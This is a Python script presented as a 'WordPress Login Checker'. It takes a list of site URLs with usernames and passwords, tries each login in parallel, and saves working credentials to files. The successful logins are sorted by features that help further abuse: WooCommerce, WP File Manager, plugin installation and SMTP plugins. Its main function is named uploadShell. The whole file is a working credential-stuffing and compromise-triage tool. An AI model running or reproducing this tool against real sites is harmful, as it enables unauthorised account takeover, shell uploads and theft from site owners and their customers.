G = '\033[0;32m'  # Green - Success
W = '\033[0;37m'  # White - Default text
R = '\033[0;31m'  # Red - Errors/Failures
C = '\033[1;36m'  # Cyan - Headers/Info
Y = '\033[0;33m'  # Yellow - Warnings/Processing
B = '\033[0;34m'  # Blue - Status updates
M = '\033[0;35m'  # Magenta - Special notices

import requests
from bs4 import BeautifulSoup
from multiprocessing.dummy import Pool as ThreadPool
import re
import os

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f'''{C}
        ╔══════════════════════════════════════════════════╗
        ║              WordPress Login Checker             ║
        ║                Author : M4RGUS                   ║
        ║                Instagram : xe.mg                 ║
        ║   Format: https://site.com:username:password     ║
        ╚══════════════════════════════════════════════════╝
        
        {W}''')


def uploadShell(site):
    try:
        parts = site.split(':')
        if len(parts) < 3:
            print(f' {W}[{R}-{W}] {site} --> {R}Invalid format!{W}')
            return
            
        site_url = ':'.join(parts[:-2])
        user = parts[-2]
        pasw = parts[-1]
        
        if not site_url.startswith(('http://', 'https://')):
            site_url = 'https://' + site_url
            print(f' {W}[{Y}*{W}] Auto-added https:// to URL: {site_url}')
        
        hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36'}
        r = requests.Session()
        
        print(f' {W}[{B}⏳{W}] Checking: {site_url}')
        cek = r.get(site_url, timeout=10)
        
        if (cek.status_code not in (301, 302, 303, 307, 308) and(cek.status_code in (200, 403) or'Powered by WordPress' in cek.text or'/wp-login.php' in cek.text)):
            print(f' {W}[{B}⏳{W}] WordPress detected, attempting login...')
            login = r.post(site_url, headers=hd, data={'log':user,'pwd':pasw}, timeout=10)
            
            if 'user-new.php' in login.text:
                print(f' {W}[{G}✓{W}] {site_url} --> {G}Login Success!{W}')
                saveLog = open('loginSuccess.txt', 'a')
                saveLog.write(site_url+':'+user+':'+pasw+'\n')
                saveLog.close()
                
                if 'WooCommerce' in login.text:
                    print(f'    {W}[{M}⚡{W}] {M}WooCommerce detected!{W}')
                    assz = open('WooCommerce.txt', 'a')
                    assz.write(site_url+':'+user+':'+pasw+'\n')
                    assz.close()
                
                if 'WP File Manager' in login.text:
                    print(f'    {W}[{M}⚡{W}] {M}WP File Manager detected!{W}')
                    assz = open('wpfilemanager.txt', 'a')
                    assz.write(site_url+':'+user+':'+pasw+'\n')
                    assz.close()
                
                if 'plugin-install.php' in login.text:
                    print(f'    {W}[{M}⚡{W}] {M}Plugin install capability detected!{W}')
                    assz = open('plugin-install.txt', 'a')
                    assz.write(site_url+':'+user+':'+pasw+'\n')
                    assz.close()
                
                if 'wp-mail-smtp' in login.text.lower() or 'smtp' in login.text.lower():
                    print(f'    {W}[{M}⚡{W}] {M}SMTP Plugin detected!{W}')
                    assz = open('smtp_plugins.txt', 'a')
                    assz.write(site_url+':'+user+':'+pasw+'\n')
                    assz.close()
                
            else:
                print(f' {W}[{R}✗{W}] {site_url} --> {R}Login Failed!{W}')
        else:
            print(f' {W}[{R}✗{W}] {site_url} --> {R}Not WordPress!{W}')
    except Exception as e:
        print(f'\n {W}[{R}⚠{W}] {site_url} --> {R}Error: {W}{str(e)}\n')

if __name__ == "__main__":
    print_banner()
    
    # Get input file
    while True:
        file_name = input(f' {W}[{C}?{W}] List file: ')
        if os.path.exists(file_name):
            break
        print(f' {W}[{R}!{W}] File not found. Please try again.')
    
    # Get thread count
    while True:
        try:
            Thread = int(input(f' {W}[{C}?{W}] Threads (1-50): '))
            if 1 <= Thread <= 50:
                break
            print(f' {W}[{R}!{W}] Please enter a value between 1 and 50.')
        except ValueError:
            print(f' {W}[{R}!{W}] Please enter a valid number.')
    
    print(f'\n {W}[{G}▶{W}] Starting WordPress login checker...\n')
    
    site = open(file_name, 'r').read().splitlines()
    pool = ThreadPool(Thread)
    pool.map(uploadShell, site)
    pool.close()
    pool.join()
    
    print(f'\n {W}[{G}✓{W}] Process completed. Results saved in respective files.{W}')
